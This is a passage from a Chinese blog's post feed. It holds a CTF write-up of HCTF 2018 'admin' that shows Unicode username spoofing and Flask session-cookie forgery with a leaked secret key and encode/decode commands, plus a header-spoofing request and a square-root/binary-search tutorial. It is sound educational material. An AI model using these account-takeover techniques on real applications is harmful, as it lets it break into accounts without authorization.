redirect(url_for(<span class="string">&#x27;register&#x27;</span>))</span><br><span class="line">        user = User(username=name)</span><br><span class="line">        user.set_password(form.password.data)</span><br><span class="line">        db.session.add(user)</span><br><span class="line">        db.session.commit()</span><br><span class="line">        flash(<span class="string">&#x27;register successful&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>, title = <span class="string">&#x27;register&#x27;</span>, form = form)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods = [<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>():</span></span><br><span class="line">    <span class="keyword">if</span> current_user.is_authenticated: <span class="comment">#当前用户登入，重定向到index</span></span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    form = LoginForm()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        name = strlower(form.username.data) <span class="comment">#strlower函数进行转换</span></span><br><span class="line">        session[<span class="string">&#x27;name&#x27;</span>] = name</span><br><span class="line">        user = User.query.filter_by(username=name).first()</span><br><span class="line">        <span class="keyword">if</span> user <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> <span class="keyword">not</span> user.check_password(form.password.data): <span class="comment">#如果用户不存在或者密码不正确</span></span><br><span class="line">            flash(<span class="string">&#x27;Invalid username or password&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">        login_user(user, remember=form.remember_me.data) <span class="comment">#登入用户</span></span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>)) <span class="comment">#重定向至index</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>, title = <span class="string">&#x27;login&#x27;</span>, form = form)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/logout&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logout</span>():</span></span><br><span class="line">    logout_user()</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&#x27;/index&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/change&#x27;</span>, methods = [<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> current_user.is_authenticated: <span class="comment">#当前用户未登入，定向至login</span></span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">    form = NewpasswordForm()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        name = strlower(session[<span class="string">&#x27;name&#x27;</span>]) <span class="comment">#经过了strlower函数进行了大小写转换</span></span><br><span class="line">        user = User.query.filter_by(username=name).first()</span><br><span class="line">        user.set_password(form.newpassword.data)</span><br><span class="line">        db.session.commit()</span><br><span class="line">        flash(<span class="string">&#x27;change successful&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;change.html&#x27;</span>, title = <span class="string">&#x27;change&#x27;</span>, form = form)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/edit&#x27;</span>, methods = [<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>():</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        </span><br><span class="line">        flash(<span class="string">&#x27;post successful&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;edit.html&#x27;</span>, title = <span class="string">&#x27;edit&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(<span class="params"><span class="number">404</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">page_not_found</span>(<span class="params">error</span>):</span></span><br><span class="line">    title = unicode(error)</span><br><span class="line">    message = error.description</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;errors.html&#x27;</span>, title=title, message=message)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">strlower</span>(<span class="params">username</span>):</span></span><br><span class="line">    username = nodeprep.prepare(username) <span class="comment">#这个strlower转换函数写的很有意思</span></span><br><span class="line">    <span class="keyword">return</span> username</span><br></pre></td></tr></table></figure><h3 id="0x03-解法1-unicode欺骗"><a href="#0x03-解法1-unicode欺骗" class="headerlink" title="0x03 解法1 unicode欺骗"></a>0x03 解法1 unicode欺骗</h3><p>经过百度谷歌搜索发现nodeprep.prepare存在unicode漏洞，对于以下字母</p><p><img src="/2021/02/24/HCTF-2018-admin/image-20210302182135700.png" class="lazyload" data-srcset="/2021/02/24/HCTF-2018-admin/image-20210302182135700.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210302182135700"></p><p>会得到的结果是ABCDEFGHIJKLMNOP等大写字母</p><p>nodeprep.prepare会进行<code>ᴀ -&gt; A -&gt; a</code></p><p>于是构造攻击链:</p><blockquote><p>注册用户ᴀdmin 相当于注册Admin</p><p>登入Admin后修改密码相当于修改了admin的密码</p><p>因为 无论是注册 登录 还是修改密码都会调用一次strlower()函数</p></blockquote><h3 id="0x04-解法2-session伪造"><a href="#0x04-解法2-session伪造" class="headerlink" title="0x04 解法2 session伪造"></a>0x04 解法2 session伪造</h3><p>根据P神的文章:<a href="https://www.leavesongs.com/PENETRATION/client-session-security.html">https://www.leavesongs.com/PENETRATION/client-session-security.html</a></p><p>我们知道python_flask 将 session保存在cookie中</p><p>我们根据<a href="https://github.com/noraj/flask-session-cookie-manager">https://github.com/noraj/flask-session-cookie-manager</a></p><p>解一下测试账户的cookie</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#39;_fresh&#39;: True, &#39;_id&#39;: b&#39;e3fcc1fd987f5faab9d0ee5fda855893be4d89bc8e4f787d17271a2c2c28889d6aac7de47f9b19399bf08298d047e471a0ef98d020a33e729ad36e137b1dec7c&#39;, &#39;csrf_token&#39;: b&#39;55784b1b7c52107000f67dfea5625d19d506d793&#39;, &#39;name&#39;: &#39;test&#39;, &#39;user_id&#39;: &#39;10&#39;&#125;</span><br></pre></td></tr></table></figure><p>我们在知道secret_key的情况下可以伪造admin，secret_key在config.py中</p><p><img src="/2021/02/24/HCTF-2018-admin/image-20210302185847364.png" class="lazyload" data-srcset="/2021/02/24/HCTF-2018-admin/image-20210302185847364.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210302185847364"></p><p>于是我们构造</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#123;&quot;_fresh&quot;:true,&quot;_id&quot;:&#123;&quot; b&quot;:&quot;ZTNmY2MxZmQ5ODdmNWZhYWI5ZDBlZTVmZGE4NTU4OTNiZTRkODliYzhlNGY3ODdkMTcyNzFhMmMyYzI4ODg5ZDZhYWM3ZGU0N2Y5YjE5Mzk5YmYwODI5OGQwNDdlNDcxYTBlZjk4ZDAyMGEzM2U3MjlhZDM2ZTEzN2IxZGVjN2M&#x3D;&quot;&#125;,&quot;csrf_token&quot;:&#123;&quot; b&quot;:&quot;NTU3ODRiMWI3YzUyMTA3MDAwZjY3ZGZlYTU2MjVkMTlkNTA2ZDc5Mw&#x3D;&#x3D;&quot;&#125;,&quot;name&quot;:&quot;admin&quot;,&quot;user_id&quot;:&quot;10&quot;&#125;&#39;</span><br></pre></td></tr></table></figure><p>伪造成功</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.eJw9kMtuwjAQRX-lmjUL6sQbJBapnEZZjCOQA5rZoDaE5mFTKQkKMeLf63bR_dxzz50HnC5DPTawmYZbvYJTe4bNA14-YQNstCOBd3Y7Waiz00du6JhLVm-WzcFxlsbalHFhdMtm3xfKtuQbqzOKwn2Pplq0f2_Q4UI-jwv1FbK_DIw4K9dakKQuleh7SY7mQuWyyHazVmerVXUnE3q6PmaVLJilHkUZYWcbVijYpF6L_M7ZodMCt_BcQTUOl9P03dfX_wlBL6jsWzzmEflyQZNEqJKZOwoKbMmUArtDULW9NolgVUmct3-464erA2KqxwlWcBvr4e858LqG5w-vGWQP.YD4iqQ.MevnBxrmcKjysXg7dvwI5MbJTTY</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">moth@DESKTOP-S6G2ROG MINGW64 /f/ctf/有用的脚本/Flask Session Cookie Decoder or Encoder/flask-session-cookie-manager-master</span><br><span class="line"><span class="meta">$</span><span class="bash"> python3 flask_session_cookie_manager3.py  decode  -c <span class="string">&#x27;.eJw9kMtuwjAQRX-lmjUL6sQbJBapnEZZjCOQA5rZoDaE5mFTKQkKMeLf63bR_dxzz50HnC5DPTawmYZbvYJTe4bNA14-YQNstCOBd3Y7Waiz00du6JhLVm-WzcFxlsbalHFhdMtm3xfKtuQbqzOKwn2Pplq0f2_Q4UI-jwv1FbK_DIw4K9dakKQuleh7SY7mQuWyyHazVmerVXUnE3q6PmaVLJilHkUZYWcbVijYpF6L_M7ZodMCt_BcQTUOl9P03dfX_wlBL6jsWzzmEflyQZNEqJKZOwoKbMmUArtDULW9NolgVUmct3-464erA2KqxwlWcBvr4e858LqG5w-vGWQP.YD4g1A.pYCCUo84nblfygDJ7Km0KFgYeb8&#x27;</span> -s <span class="string">&#x27;ckj123&#x27;</span></span></span><br><span class="line">&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: b&#x27;e3fcc1fd987f5faab9d0ee5fda855893be4d89bc8e4f787d17271a2c2c28889d6aac7de47f9b19399bf08298d047e471a0ef98d020a33e729ad36e137b1dec7c&#x27;, &#x27;csrf_token&#x27;: b&#x27;55784b1b7c52107000f67dfea5625d19d506d793&#x27;, &#x27;name&#x27;: &#x27;test&#x27;, &#x27;user_id&#x27;: &#x27;10&#x27;&#125;</span><br><span class="line"></span><br><span class="line">moth@DESKTOP-S6G2ROG MINGW64 /f/ctf/有用的脚本/Flask Session Cookie Decoder or Encoder/flask-session-cookie-manager-master</span><br><span class="line"><span class="meta">$</span><span class="bash"> python3 flask_session_cookie_manager3.py  encode -t <span class="string">&quot;&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: b&#x27;e3fcc1fd987f5faab9d0ee5fda855893be4d89bc8e4f787d17271a2c2c28889d6aac7de47f9b19399bf08298d047e471a0ef98d020a33e729ad36e137b1dec7c&#x27;, &#x27;csrf_token&#x27;: b&#x27;55784b1b7c52107000f67dfea5625d19d506d793&#x27;, &#x27;name&#x27;: &#x27;test&#x27;, &#x27;user_id&#x27;: &#x27;10&#x27;&#125;&quot;</span> -s <span class="string">&#x27;ckj123&#x27;</span></span></span><br><span class="line">.eJw9kMtuwjAQRX-lmjUL6sQbJBapnEZZjCOQA5rZoDaE5mFTKQkKMeLf63bR_dxzz50HnC5DPTawmYZbvYJTe4bNA14-YQNstCOBd3Y7Waiz00du6JhLVm-WzcFxlsbalHFhdMtm3xfKtuQbqzOKwn2Pplq0f2_Q4UI-jwv1FbK_DIw4K9dakKQuleh7SY7mQuWyyHazVmerVXUnE3q6PmaVLJilHkUZYWcbVijYpF6L_M7ZodMCt_BcQTUOl9P03dfX_wlBL6jsWzzmEflyQZNEqJKZOwoKbMmUArtDULW9NolgVUmct3-464erA2KqxwlWcBvr4e858LqG5w-vGWQP.YD4iqQ.MevnBxrmcKjysXg7dvwI5MbJTTY</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf-Write up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> unicode欺骗 </tag>
            
            <tag> session伪造 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hgame2021做题笔记</title>
      <link href="2021/02/21/hgame2021%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/"/>
      <url>2021/02/21/hgame2021%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>hgame2021,跟着做做，巩固所学，顺便看看有什么新东西</p><span id="more"></span><h2 id="WEEK1"><a href="#WEEK1" class="headerlink" title="WEEK1"></a>WEEK1</h2><hr><h3 id="web–Hitchhiking-in-the-Galaxy"><a href="#web–Hitchhiking-in-the-Galaxy" class="headerlink" title="web–Hitchhiking_in_the_Galaxy"></a>web–Hitchhiking_in_the_Galaxy</h3><hr><p>考点是http协议的一些基本点如User-Agent、Referer、X-Forwarded-For等</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/HitchhikerGuide.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>hitchhiker42.0727.site:42420</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Infinite Improbability Drive/83.0</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>https://cardinal.ink/</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">X-Forwarded-For</span><span class="punctuation">: </span>127.0.0.1</span><br></pre></td></tr></table></figure><p>web–</p>]]></content>
      
      
      <categories>
          
          <category> ctf-Write up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf-web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>算法入门--跳到平方根之查找</title>
      <link href="2021/02/18/%E7%AE%97%E6%B3%95%E5%85%A5%E9%97%A8-%E8%B7%B3%E5%88%B0%E5%B9%B3%E6%96%B9%E6%A0%B9%E4%B9%8B%E6%9F%A5%E6%89%BE/"/>
      <url>2021/02/18/%E7%AE%97%E6%B3%95%E5%85%A5%E9%97%A8-%E8%B7%B3%E5%88%B0%E5%B9%B3%E6%96%B9%E6%A0%B9%E4%B9%8B%E6%9F%A5%E6%89%BE/</url>
      
        <content type="html"><![CDATA[<p>浮点数和算数、面向连续域的折半查找和面向离散域的二分搜索</p><span id="more"></span><h3 id="0x01-迭代查找"><a href="#0x01-迭代查找" class="headerlink" title="0x01 迭代查找"></a>0x01 迭代查找</h3><p>已知数字n是完全平方数，尝试从1开始求平方，如果平方小于n，则递增到2，以此类推，直至找到平方根a使其满足 a的平方等于后退出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">findSquareRoot</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">if</span> x&lt;<span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;sorry,no imaginary numbers!&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> </span><br><span class="line">    ans=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> ans**<span class="number">2</span>&lt;x:</span><br><span class="line">        ans=ans+<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> ans**<span class="number">2</span> !=x:</span><br><span class="line">        <span class="built_in">print</span>(x,<span class="string">&#x27;is not a perfect square&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;square root of &#x27;</span>+ <span class="built_in">str</span>(x)+<span class="string">&#x27; is  close to&#x27;</span>+<span class="built_in">str</span>(ans-<span class="number">1</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Square root of &#x27;</span>+ <span class="built_in">str</span>(x)+<span class="string">&#x27; is &#x27;</span>+<span class="built_in">str</span>(ans))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    findSquareRoot(<span class="number">65536</span>)</span><br><span class="line"> findSquareRoot(<span class="number">65535</span>)</span><br></pre></td></tr></table></figure><p>然而我们发现</p><p><img src="/2021/02/18/%E7%AE%97%E6%B3%95%E5%85%A5%E9%97%A8-%E8%B7%B3%E5%88%B0%E5%B9%B3%E6%96%B9%E6%A0%B9%E4%B9%8B%E6%9F%A5%E6%89%BE/image-20210218121111337.png" class="lazyload" data-srcset="/2021/02/18/%E7%AE%97%E6%B3%95%E5%85%A5%E9%97%A8-%E8%B7%B3%E5%88%B0%E5%B9%B3%E6%96%B9%E6%A0%B9%E4%B9%8B%E6%9F%A5%E6%89%BE/image-20210218121111337.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210218121111337"></p><p>显然这并不正确，65535的平方根应该更接近256才对，于是我们优化一下，引入了小数，并且引入了更小的增量相比于1</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">findSquareRootWithinError</span>(<span class="params">x,epsilion,increment</span>):</span></span><br><span class="line">    <span class="keyword">if</span> x &lt; <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Sorry,no imaginary numbers!&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    numGuesses = <span class="number">0</span></span><br><span class="line">    ans = <span class="number">0.0</span></span><br><span class="line">    <span class="keyword">while</span> x - ans**<span class="number">2</span> &gt; epsilion:</span><br><span class="line">        ans += increment</span><br><span class="line">        numGuesses+=<span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;numGuesses = &#x27;</span>,numGuesses)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">abs</span>(x-ans **<span class="number">2</span> )&gt;epsilion:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Falied on Square root of&quot;</span>,x)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(ans,<span class="string">&#x27;is close to square root of&#x27;</span>, x)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    findSquareRootWithinError(<span class="number">65535</span>,<span class="number">.01</span>,<span class="number">.001</span>)</span><br><span class="line">    findSquareRootWithinError(<span class="number">65535</span>,<span class="number">.01</span>,<span class="number">.0001</span>)</span><br><span class="line">    findSquareRootWithinError(<span class="number">65535</span>,<span class="number">.01</span>,<span class="number">.00001</span>)</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">E:\vscode\python&gt; e: &amp;&amp; cd e:\vscode\python &amp;&amp; cmd /C &quot;D:\python38\python3.exe c:\Users\moth\.vscode\extensions\ms-python.python-2021.2.576481509\pythonFiles\lib\python\debugpy\launcher 59895 -- e:\vscode\python\跳到平方根\1.py &quot;</span><br><span class="line">numGuesses =  255999</span><br><span class="line">Falied on Square root of 65535</span><br><span class="line">numGuesses =  2559981</span><br><span class="line">Falied on Square root of 65535</span><br><span class="line">numGuesses =  25599803</span><br><span class="line">255.99803007005775 is close to square root of 65535</span><br></pre></td></tr></table></figure><p>然而这个算法中，我们发现对于increment偏大的情况很容易不成功，具体原因是因为</p><p><img src="/2021/02/18/%E7%AE%97%E6%B3%95%E5%85%A5%E9%97%A8-%E8%B7%B3%E5%88%B0%E5%B9%B3%E6%96%B9%E6%A0%B9%E4%B9%8B%E6%9F%A5%E6%89%BE/image-20210218122711318.png" class="lazyload" data-srcset="/2021/02/18/%E7%AE%97%E6%B3%95%E5%85%A5%E9%97%A8-%E8%B7%B3%E5%88%B0%E5%B9%B3%E6%96%B9%E6%A0%B9%E4%B9%8B%E6%9F%A5%E6%89%BE/image-20210218122711318.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210218122711318"></p><p>因为<code>a**2 - (a-1)**2</code>是逐渐增大的，从而会造成出现上述情况，我们只能通过调小increment的值从而得到结果</p><p>但是调小increment意味着计算次数特别大，比如上面测试的数据 进行了25599803次计算，才得到结果</p><h3 id="0x02-折半查找"><a href="#0x02-折半查找" class="headerlink" title="0x02 折半查找"></a>0x02 折半查找</h3><p>为了优化上述算法，我们可以找到一个ans值，测试如果 ans**2&gt;x，那么就不需要检查大于ans的猜测，同样测试如果</p><p>ans**2&lt;x，那么就不需要检查小于ans的猜测。所以在上述情况中，我们可以缩小范围为[0,ans]和[ans,x]。当我们已得到</p><p>范围[0,ans]和[ans,x],从两个极值中取中间值是比较合理的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bisectionSearchForSquareRoot</span>(<span class="params">x, epslion</span>):</span></span><br><span class="line">    <span class="keyword">if</span> x &lt; <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Sorry,imaginary numbers are out of &#x27;</span>, x)</span><br><span class="line">    numGuesses = <span class="number">0</span></span><br><span class="line">    low = <span class="number">0.0</span></span><br><span class="line">    high = x</span><br><span class="line">    ans = (low + high) / <span class="number">2.0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">abs</span>(ans**<span class="number">2</span> - x) &gt;= epslion:</span><br><span class="line">        <span class="keyword">if</span> ans**<span class="number">2</span> &lt; x:</span><br><span class="line">            low = ans</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = ans</span><br><span class="line">        ans = (high + low) / <span class="number">2.0</span></span><br><span class="line">        numGuesses += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;numGuesses =&#x27;</span>, numGuesses)</span><br><span class="line">    <span class="built_in">print</span>(ans, <span class="string">&#x27;is close to square root of&#x27;</span>, x)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    bisectionSearchForSquareRoot(<span class="number">65535</span>,<span class="number">.01</span>)</span><br></pre></td></tr></table></figure><p><img src="/2021/02/18/%E7%AE%97%E6%B3%95%E5%85%A5%E9%97%A8-%E8%B7%B3%E5%88%B0%E5%B9%B3%E6%96%B9%E6%A0%B9%E4%B9%8B%E6%9F%A5%E6%89%BE/image-20210218142748221.png" class="lazyload" data-srcset="/2021/02/18/%E7%AE%97%E6%B3%95%E5%85%A5%E9%97%A8-%E8%B7%B3%E5%88%B0%E5%B9%B3%E6%96%B9%E6%A0%B9%E4%B9%8B%E6%9F%A5%E6%89%BE/image-20210218142748221.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210218142748221"></p><p>极大地提高了程序的效率</p><h3 id="0x03-二分搜索"><a href="#0x03-二分搜索" class="headerlink" title="0x03 二分搜索"></a>0x03 二分搜索</h3><p>对连续变量做折半查找的思路，与离散变量的二分搜索密切相关，接下来我们看一下二分搜索</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bsearch</span>(<span class="params">value,L</span>):</span></span><br><span class="line">    NOTFOUND=-<span class="number">1</span></span><br><span class="line">    lo,hi=<span class="number">0</span>,<span class="built_in">len</span>(L)-<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> lo&lt;= hi:</span><br><span class="line">        mid=(lo +hi)&gt;&gt;<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> L[mid]&lt;value:</span><br><span class="line">            lo =mid +<span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> value &lt;L[mid]:</span><br><span class="line">            hi = mid -<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> mid</span><br><span class="line">    <span class="keyword">return</span> NOTFOUND</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    Ls=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">10</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">35</span>,<span class="number">76</span>,<span class="number">88</span>,<span class="number">93</span>]</span><br><span class="line">    <span class="built_in">print</span>(bsearch(<span 